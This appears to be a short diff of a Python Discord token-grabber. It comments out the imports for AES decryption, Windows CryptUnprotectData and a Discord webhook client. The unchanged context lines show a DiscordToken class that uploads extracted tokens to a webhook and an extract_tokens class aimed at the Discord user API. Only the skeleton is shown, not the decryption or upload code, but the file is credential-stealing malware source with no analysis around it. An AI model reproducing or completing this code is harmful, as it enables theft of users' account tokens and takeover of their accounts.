@@ -1,17 +1,16 @@
-import base64
-import json
-import os
-import re
-
-import requests
-from Crypto.Cipher import AES
-from discord import Embed, SyncWebhook
-from win32crypt import CryptUnprotectData
+# import base64
+# import json
+# import os
+# import re
+# import requests
+# from Crypto.Cipher import AES
+# from discord import Embed, SyncWebhook
+# from win32crypt import CryptUnprotectData
 
 class DiscordToken:
     def __init__(self, webhook):
         upload_tokens(webhook).upload()
-        
+
 class extract_tokens:
     def __init__(self) -> None:
         self.base_url = "https://discord.com/api/v9/users/@me"
